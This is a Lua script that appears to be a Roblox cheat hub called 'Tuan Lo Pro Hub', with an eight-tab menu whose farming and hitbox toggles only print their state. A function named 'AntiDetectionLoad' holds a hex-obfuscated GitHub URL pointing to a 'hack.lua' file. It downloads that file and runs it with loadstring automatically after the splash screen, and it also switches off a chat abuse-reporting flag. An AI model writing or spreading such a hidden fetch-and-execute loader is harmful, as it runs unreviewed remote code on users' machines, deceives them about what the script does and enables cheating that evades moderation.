--[[
    ========================================================================
       TUAN LO PRO HUB - BẢN ĐỎ PREMIUM (8 TABS - ĐÃ SỬA LỖI CHỐNG SPAM CODE)
    ========================================================================
]]

local LPH_Name = "Tuan Lo Pro Hub"
local LPH_Developer = "Tuan Lo Developer"
local LPH_Version = "v4.1 Premium"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- KIỂM TRA CHỐNG TRÙNG VÀ SPAM CODE (NẾU ĐÃ CHẠY RỒI THÌ DỪNG LẠI NGAY)
if _G.TuanLoHubLoaded then 
    warn("[Tuan Lo Hub]: Script đã được chạy trước đó! Chặn kích hoạt trùng lặp.")
    return 
end
_G.TuanLoHubLoaded = true -- Đánh dấu đã chạy thành công lần đầu tiên

-- Khởi tạo ScreenGui chính
local MainGui = Instance.new("ScreenGui")
MainGui.Name = "LPH_" .. tostring(math.random(100000, 999999))
MainGui.ResetOnSpawn = false
MainGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

if gethui then MainGui.Parent = gethui()
elseif syn and syn.protect_gui then syn.protect_gui(MainGui) MainGui.Parent = game:GetService("CoreGui")
else pcall(function() MainGui.Parent = game:GetService("CoreGui") end) end

local function ApplyTween(object, properties, duration)
    TweenService:Create(object, TweenInfo.new(duration, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), properties):Play()
end

local function MakeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true dragStart = input.Position startPos = frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    frame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- HỆ THỐNG LOADSTRING BẢO MẬT (ĐÃ THÊM CƠ CHẾ CHỐNG SPAM)
local function AntiDetectionLoad()
    if _G.ScriptFarmRunning then return end -- Nếu code farm đang chạy ngầm rồi thì không chạy lại nữa
    _G.ScriptFarmRunning = true

    task.spawn(function()
        local success, err = pcall(function()
            if setfflag then pcall(function() setfflag("ReportAbuseChat", "False") end) end
            
            -- Chuỗi Hex mã hóa link của bạn
            local EncryptedLink = ""
            local HexTable = {
                0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x72, 0x61, 0x77, 0x2e, 
                0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x75, 0x73, 0x65, 0x72, 0x63, 0x6f, 
                0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x70, 0x72, 
                0x6f, 0x6c, 0x75, 0x61, 0x31, 0x2f, 0x70, 0x72, 0x6f, 0x2d, 0x6c, 0x75, 
                0x61, 0x2f, 0x72, 0x65, 0x66, 0x73, 0x2f, 0x68, 0x65, 0x61, 0x64, 0x73, 
                0x2f, 0x6d, 0x61, 0x69, 0x6e, 0x2f, 0x68, 0x61, 0x63, 0x6b, 0x2e, 0x6c, 0x75, 0x61
            }
            for _, v in ipairs(HexTable) do EncryptedLink = EncryptedLink .. string.char(v) end
            
            local SecureGet = game.HttpGet
            local SecureLoad = loadstring
            local RawCode = SecureGet(game, EncryptedLink)
            local Executable = SecureLoad(RawCode)
            if Executable then 
                task.spawn(Executable) 
                print("[Tuan Lo Hub]: Đã kích hoạt hệ thống chạy ngầm an toàn.")
            end
        end)
        
        if not success then
            _G.ScriptFarmRunning = false -- Nếu lỗi thì reset để có thể thử lại lần sau
            warn("[Tuan Lo Hub]: Lỗi tải ngầm: " .. tostring(err))
        end
    end)
end

-- ========================================================================
--  HIỆU ỨNG CHÀO MỪNG (SPLASH SCREEN ĐỎ NEON)
-- ========================================================================
local function PlayWelcomeSplash(OnSplashFinished)
    local SplashFrame = Instance.new("Frame")
    SplashFrame.Size = UDim2.new(1, 0, 1, 0)
    SplashFrame.BackgroundColor3 = Color3.fromRGB(15, 5, 5)
    SplashFrame.BackgroundTransparency = 1
    SplashFrame.ZIndex = 9999
    SplashFrame.Parent = MainGui

    local SplashText = Instance.new("TextLabel")
    SplashText.Size = UDim2.new(1, 0, 0, 60)
    SplashText.Position = UDim2.new(0, 0, 0.5, -30)
    SplashText.BackgroundTransparency = 1
    SplashText.Font = Enum.Font.FredokaOne
    SplashText.Text = "Chào mừng đến với Tuấn Lọ Hub"
    SplashText.TextColor3 = Color3.fromRGB(255, 255, 255)
    SplashText.TextSize = 28
    SplashText.TextTransparency = 1
    SplashText.Parent = SplashFrame

    local TextStroke = Instance.new("UIStroke")
    TextStroke.Color = Color3.fromRGB(255, 0, 0)
    TextStroke.Thickness = 2
    TextStroke.Transparency = 1
    TextStroke.Parent = SplashText

    ApplyTween(SplashFrame, {BackgroundTransparency = 0.15}, 0.8)
    ApplyTween(SplashText, {TextTransparency = 0}, 0.8)
    ApplyTween(TextStroke, {Transparency = 0.2}, 0.8)
    task.wait(2.0)
    ApplyTween(SplashFrame, {BackgroundTransparency = 1}, 0.5)
    ApplyTween(SplashText, {TextTransparency = 1}, 0.5)
    ApplyTween(TextStroke, {Transparency = 1}, 0.5)
    task.wait(0.5)
    SplashFrame:Destroy()
    OnSplashFinished()
end

-- ========================================================================
--  PHẦN GIAO DIỆN CHÍNH (8 TABS ĐỎ NEON)
-- ========================================================================
local function LoadMainMenu()
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 560, 0, 360)
    MainFrame.Position = UDim2.new(0.5, -280, 0.5, -180)
    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 10)
    MainFrame.BorderSizePixel = 0
    MainFrame.ClipsDescendants = true
    MainFrame.Parent = MainGui
    MakeDraggable(MainFrame)

    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
    local MainStroke = Instance.new("UIStroke", MainFrame) MainStroke.Color = Color3.fromRGB(255, 30, 30) MainStroke.Thickness = 1.5

    -- Nút tròn thu nhỏ (Floating Button Đỏ)
    local MinimizeBtn = Instance.new("ImageButton")
    MinimizeBtn.Size = UDim2.new(0, 50, 0, 50)
    MinimizeBtn.Position = UDim2.new(0, 20, 0, 20)
    MinimizeBtn.BackgroundColor3 = Color3.fromRGB(25, 10, 10)
    MinimizeBtn.Image = "rbxassetid://6031265975" 
    MinimizeBtn.ImageColor3 = Color3.fromRGB(255, 30, 30)
    MinimizeBtn.Visible = false
    MinimizeBtn.Parent = MainGui
    MakeDraggable(MinimizeBtn)

    Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)
    local MiniStroke = Instance.new("UIStroke", MinimizeBtn) MiniStroke.Color = Color3.fromRGB(255, 30, 30) MiniStroke.Thickness = 2

    -- Thanh tiêu đề
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 45)
    TitleBar.BackgroundColor3 = Color3.fromRGB(25, 12, 12)
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = MainFrame

    local HubIcon = Instance.new("ImageLabel")
    HubIcon.Size = UDim2.new(0, 24, 0, 24)
    HubIcon.Position = UDim2.new(0, 15, 0.5, -12)
    HubIcon.BackgroundTransparency = 1
    HubIcon.Image = "rbxassetid://6031265975"
    HubIcon.ImageColor3 = Color3.fromRGB(255, 30, 30)
    HubIcon.Parent = TitleBar

    local TitleText = Instance.new("TextLabel")
    TitleText.Size = UDim2.new(1, -90, 1, 0)
    TitleText.Position = UDim2.new(0, 48, 0, 0)
    TitleText.BackgroundTransparency = 1
    TitleText.Font = Enum.Font.FredokaOne
    TitleText.Text = LPH_Name .. " — " .. LPH_Version
    TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleText.TextSize = 15
    TitleText.TextXAlignment = Enum.TextXAlignment.Left
    TitleText.Parent = TitleBar

    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 26, 0, 26)
    CloseBtn.Position = UDim2.new(1, -36, 0.5, -13)
    CloseBtn.BackgroundColor3 = Color3.fromRGB(60, 25, 25)
    CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.Text = "-"
    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseBtn.TextSize = 14
    CloseBtn.Parent = TitleBar
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)

    -- Sự kiện ẩn/hiện ẩn danh
    CloseBtn.MouseButton1Click:Connect(function()
        ApplyTween(MainFrame, {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}, 0.2)
        task.wait(0.2)
        MainFrame.Visible = false MinimizeBtn.Visible = true
        ApplyTween(MinimizeBtn, {Size = UDim2.new(0, 50, 0, 50)}, 0.2)
    end)
    MinimizeBtn.MouseButton1Click:Connect(function()
        ApplyTween(MinimizeBtn, {Size = UDim2.new(0, 0, 0, 0)}, 0.2)
        task.wait(0.2)
        MinimizeBtn.Visible = false MainFrame.Visible = true
        ApplyTween(MainFrame, {Size = UDim2.new(0, 560, 0, 360), BackgroundTransparency = 0}, 0.2)
    end)

    -- Thanh chứa Tab bên trái
    local TabScroll = Instance.new("ScrollingFrame")
    TabScroll.Size = UDim2.new(0, 140, 1, -45)
    TabScroll.Position = UDim2.new(0, 0, 0, 45)
    TabScroll.BackgroundColor3 = Color3.fromRGB(20, 12, 12)
    TabScroll.BorderSizePixel = 0
    TabScroll.CanvasSize = UDim2.new(0, 0, 0, 350)
    TabScroll.ScrollBarThickness = 2
    TabScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 30, 30)
    TabScroll.Parent = MainFrame

    local TabListLayout = Instance.new("UIListLayout") TabListLayout.Parent = TabScroll TabListLayout.Padding = UDim.new(0, 4) TabListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    -- Khung nội dung bên phải
    local ContentContainer = Instance.new("Frame")
    ContentContainer.Size = UDim2.new(1, -150, 1, -55)
    ContentContainer.Position = UDim2.new(0, 145, 0, 50)
    ContentContainer.BackgroundTransparency = 1
    ContentContainer.Parent = MainFrame

    local activeTab = nil

    local function CreateTab(tabName, iconId)
        local TabPage = Instance.new("ScrollingFrame")
        TabPage.Size = UDim2.new(1, 0, 1, 0)
        TabPage.BackgroundTransparency = 1
        TabPage.BorderSizePixel = 0
        TabPage.Visible = false
        TabPage.CanvasSize = UDim2.new(0, 0, 2, 0)
        TabPage.ScrollBarThickness = 3
        TabPage.ScrollBarImageColor3 = Color3.fromRGB(255, 30, 30)
        TabPage.Parent = ContentContainer
        Instance.new("UIListLayout", TabPage).Padding = UDim.new(0, 8)

        local TabBtn = Instance.new("TextButton")
        TabBtn.Size = UDim2.new(0, 130, 0, 36)
        TabBtn.BackgroundColor3 = Color3.fromRGB(28, 16, 16)
        TabBtn.Text = ""
        TabBtn.Parent = TabScroll
        Instance.new("UICorner", TabBtn).CornerRadius = UDim.new(0, 6)

        local TabIcon = Instance.new("ImageLabel")
        TabIcon.Size = UDim2.new(0, 18, 0, 18)
        TabIcon.Position = UDim2.new(0, 8, 0.5, -9)
        TabIcon.BackgroundTransparency = 1
        TabIcon.Image = "rbxassetid://" .. tostring(iconId)
        TabIcon.ImageColor3 = Color3.fromRGB(150, 150, 150)
        TabIcon.Parent = TabBtn

        local TabLabel = Instance.new("TextLabel")
        TabLabel.Size = UDim2.new(1, -34, 1, 0)
        TabLabel.Position = UDim2.new(0, 30, 0, 0)
        TabLabel.BackgroundTransparency = 1
        TabLabel.Font = Enum.Font.GothamBold
        TabLabel.Text = tabName
        TabLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
        TabLabel.TextSize = 11
        TabLabel.TextXAlignment = Enum.TextXAlignment.Left
        TabLabel.Parent = TabBtn

        local function Select()
            if activeTab then
                activeTab.Page.Visible = false
                ApplyTween(activeTab.Button, {BackgroundColor3 = Color3.fromRGB(28, 16, 16)}, 0.15)
                ApplyTween(activeTab.Icon, {ImageColor3 = Color3.fromRGB(150, 150, 150)}, 0.15)
                ApplyTween(activeTab.Label, {TextColor3 = Color3.fromRGB(180, 180, 180)}, 0.15)
            end
            activeTab = {Page = TabPage, Button = TabBtn, Icon = TabIcon, Label = TabLabel}
            TabPage.Visible = true
            ApplyTween(TabBtn, {BackgroundColor3 = Color3.fromRGB(60, 15, 15)}, 0.15)
            ApplyTween(TabIcon, {ImageColor3 = Color3.fromRGB(255, 30, 30)}, 0.15)
            ApplyTween(TabLabel, {TextColor3 = Color3.fromRGB(255, 255, 255)}, 0.15)
        end

        TabBtn.MouseButton1Click:Connect(Select)
        
        local function AddToggle(name, toggleIconId, callback)
            local state = false
            local ToggleFrame = Instance.new("Frame")
            ToggleFrame.Size = UDim2.new(1, -6, 0, 40)
            ToggleFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 15)
            ToggleFrame.Parent = TabPage
            Instance.new("UICorner", ToggleFrame).CornerRadius = UDim.new(0, 6)

            local ToggleIcon = Instance.new("ImageLabel")
            ToggleIcon.Size = UDim2.new(0, 20, 0, 20)
            ToggleIcon.Position = UDim2.new(0, 12, 0.5, -10)
            ToggleIcon.BackgroundTransparency = 1
            ToggleIcon.Image = "rbxassetid://" .. tostring(toggleIconId)
            ToggleIcon.ImageColor3 = Color3.fromRGB(200, 150, 150)
            ToggleIcon.Parent = ToggleFrame

            local Label = Instance.new("TextLabel")
            Label.Size = UDim2.new(1, -100, 1, 0)
            Label.Position = UDim2.new(0, 42, 0, 0)
            Label.BackgroundTransparency = 1
            Label.Font = Enum.Font.GothamBold
            Label.Text = name
            Label.TextColor3 = Color3.fromRGB(240, 210, 210)
            Label.TextSize = 12
            Label.TextXAlignment = Enum.TextXAlignment.Left
            Label.Parent = ToggleFrame

            local ToggleBtn = Instance.new("TextButton")
            ToggleBtn.Size = UDim2.new(0, 42, 0, 22)
            ToggleBtn.Position = UDim2.new(1, -54, 0.5, -11)
            ToggleBtn.BackgroundColor3 = Color3.fromRGB(60, 40, 40)
            ToggleBtn.Text = ""
            ToggleBtn.ZIndex = 2
            ToggleBtn.Parent = ToggleFrame
            Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)

            local Indicator = Instance.new("Frame")
            Indicator.Size = UDim2.new(0, 16, 0, 16)
            Indicator.Position = UDim2.new(0, 3, 0.5, -8)
            Indicator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Indicator.BorderSizePixel = 0
            Indicator.ZIndex = 3
            Indicator.Parent = ToggleBtn
            Instance.new("UICorner", Indicator).CornerRadius = UDim.new(1, 0)

            ToggleBtn.MouseButton1Click:Connect(function()
                state = not state
                ApplyTween(ToggleBtn, {BackgroundColor3 = state and Color3.fromRGB(255, 30, 30) or Color3.fromRGB(60, 40, 40)}, 0.15)
                ApplyTween(Indicator, {Position = state and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)}, 0.15)
                ApplyTween(ToggleIcon, {ImageColor3 = state and Color3.fromRGB(255, 80, 80) or Color3.fromRGB(200, 150, 150)}, 0.15)
                task.spawn(callback, state)
            end)
        end

        return {Select = Select, AddToggle = AddToggle}
    end

    -- Khởi tạo 8 Tabs
    local Tab1 = CreateTab("Chính (Main)", 10747373999)
    local Tab2 = CreateTab("Phụ (Main 2)", 10747383471)
    local Tab3 = CreateTab("Chỉ Số (Stats)", 10747362071)
    local Tab4 = CreateTab("Dịch Chuyển", 10747371971)
    local Tab5 = CreateTab("Phó Bản (Raid)", 10747373999)
    local Tab6 = CreateTab("khong biết (Sea)", 10747383471)
    local Tab7 = CreateTab("Trái Ác Quỷ", 10747362071)
    local Tab8 = CreateTab("Hiển Thị (Visual)", 10747371971)

    Tab1.Select()

    -- Danh sách nút bấm mẫu cho các Tab
    Tab1.AddToggle("Tự Động Farm Cấp Độ", 10747373999, function(v) print("Auto Farm:", v) end)
    Tab1.AddToggle("Gom Quái (Bring Mob)", 10747383471, function(v) print("Bring Mob:", v) end)

    Tab2.AddToggle("Tầm Đánh Rộng (Hitbox)", 10747362071, function(v) print("Hitbox:", v) end)
    Tab2.AddToggle("Đánh Siêu Nhanh", 10747371971, function(v) print("Fast Attack:", v) end)
end

-- VÒNG ĐỜI KHỞI CHẠY KHÔNG SPAM
PlayWelcomeSplash(function()
    AntiDetectionLoad() -- Gọi nạp link an toàn (Chỉ chạy duy nhất 1 lần)
    LoadMainMenu()      -- Mở giao diện
end)
